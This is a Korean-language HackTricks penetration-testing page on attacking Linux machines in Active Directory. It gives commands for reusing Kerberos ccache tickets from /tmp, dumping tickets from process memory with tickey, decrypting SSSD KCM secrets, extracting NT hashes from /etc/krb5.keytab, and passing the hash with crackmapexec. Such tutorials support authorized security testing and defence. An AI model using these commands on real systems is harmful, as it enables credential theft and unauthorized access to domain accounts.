# Linux Active Directory

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>

리눅스 머신은 Active Directory 환경 내에도 존재할 수 있습니다.

AD에서의 리눅스 머신은 **파일 내에 다양한 CCACHE 티켓을 저장**할 수 있습니다. 이 티켓은 다른 Kerberos 티켓과 마찬가지로 사용되고 악용될 수 있습니다. 이 티켓을 읽으려면 티켓의 사용자 소유자이거나 머신 내의 **root** 여야 합니다.

## 열거

### 리눅스에서의 AD 열거

리눅스에서 AD에 액세스할 수 있다면 (또는 Windows의 bash에서) [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)을 사용하여 AD를 열거해볼 수 있습니다.

리눅스에서 AD를 열거하는 **다른 방법**을 알아보려면 다음 페이지를 확인하세요:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA는 주로 **Unix** 환경을 위한 Microsoft Windows **Active Directory**의 오픈 소스 **대체**입니다. 이는 Active Directory와 유사한 관리를 위한 완전한 **LDAP 디렉터리**와 MIT **Kerberos** 키 배포 센터를 결합합니다. CA 및 RA 인증서 관리를 위해 Dogtag **Certificate System**을 활용하며, 스마트 카드를 포함한 **다중 인증**을 지원합니다. Unix 인증 프로세스에는 SSSD가 통합되어 있습니다. 자세한 내용은 다음에서 알아보세요:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## 티켓 조작

### Pass The Ticket

이 페이지에서는 리눅스 호스트 내에서 **커버로스 티켓을 찾을 수 있는 다양한 위치**를 찾을 수 있습니다. 다음 페이지에서는 이 CCache 티켓 형식을 Windows에서 사용해야 하는 형식인 Kirbi로 변환하는 방법과 PTT(티켓 전달) 공격을 수행하는 방법을 배울 수 있습니다:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### /tmp에서의 CCACHE 티켓 재사용

CCACHE 파일은 **Kerberos 자격 증명을 저장**하기 위한 이진 형식입니다. 일반적으로 `/tmp`에 600 권한으로 저장됩니다. 이 파일은 사용자의 UID와 관련된 **이름 형식인 `krb5cc_%{uid}`**로 식별될 수 있습니다. 인증 티켓 확인을 위해 **환경 변수 `KRB5CCNAME`**은 원하는 티켓 파일의 경로로 설정되어야 하며, 이를 통해 재사용할 수 있습니다.

`env | grep KRB5CCNAME`을 사용하여 현재 인증에 사용되는 티켓을 나열합니다. 형식은 이식 가능하며, `export KRB5CCNAME=/tmp/ticket.ccache`와 같이 환경 변수를 설정하여 티켓을 **재사용**할 수 있습니다. Kerberos 티켓 이름 형식은 uid가 사용자 UID인 `krb5cc_%{uid}`입니다.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### CCACHE 티켓 재사용을 위한 키링

**프로세스 메모리에 저장된 Kerberos 티켓은 추출될 수 있습니다**, 특히 기계의 ptrace 보호가 비활성화된 경우 (`/proc/sys/kernel/yama/ptrace_scope`). 이를 위한 유용한 도구는 [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)에서 찾을 수 있으며, 세션에 주입하여 티켓을 `/tmp`에 덤프하는 기능을 제공합니다.

이 도구를 구성하고 사용하기 위해 다음 단계를 따릅니다:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
이 절차는 다양한 세션에 주입을 시도하며, 추출된 티켓을 `/tmp`에 `__krb_UID.ccache`라는 이름 규칙으로 저장하여 성공 여부를 나타냅니다.


### SSSD KCM에서 CCACHE 티켓 재사용

SSSD는 경로 `/var/lib/sss/secrets/secrets.ldb`에 데이터베이스의 사본을 유지합니다. 해당 키는 경로 `/var/lib/sss/secrets/.secrets.mkey`에 숨겨진 파일로 저장됩니다. 기본적으로 해당 키는 **root** 권한이 있는 경우에만 읽을 수 있습니다.

`SSSDKCMExtractor`를 --database 및 --key 매개변수와 함께 호출하면 데이터베이스를 구문 분석하고 **비밀을 복호화**합니다.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**크리덴셜 캐시 Kerberos blob은 Mimikatz/Rubeus에 전달할 수 있는 사용 가능한 Kerberos CCache 파일로 변환될 수 있습니다.**

### 키탭에서 CCACHE 티켓 재사용하기
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### /etc/krb5.keytab에서 계정 추출하기

루트 권한으로 작동하는 서비스에 필수적인 서비스 계정 키는 **`/etc/krb5.keytab`** 파일에 안전하게 저장됩니다. 이 키는 서비스용 비밀번호와 유사하게 엄격한 기밀성을 요구합니다.

키탭 파일의 내용을 검사하기 위해 **`klist`**를 사용할 수 있습니다. 이 도구는 키의 세부 정보를 표시하는 데 사용되며, 키 유형이 23으로 식별될 때 특히 사용자 인증을 위한 **NT 해시**를 표시합니다.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
리눅스 사용자에게는 **`KeyTabExtract`**가 제공되며, 이를 통해 NTLM 해시 재사용에 활용할 수 있는 RC4 HMAC 해시를 추출할 수 있습니다.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS에서는 **`bifrost`**가 keytab 파일 분석 도구로 사용됩니다.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
추출된 계정 및 해시 정보를 활용하여 **`crackmapexec`**와 같은 도구를 사용하여 서버에 연결할 수 있습니다.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## 참고 자료
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹을 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해주세요.

</details>
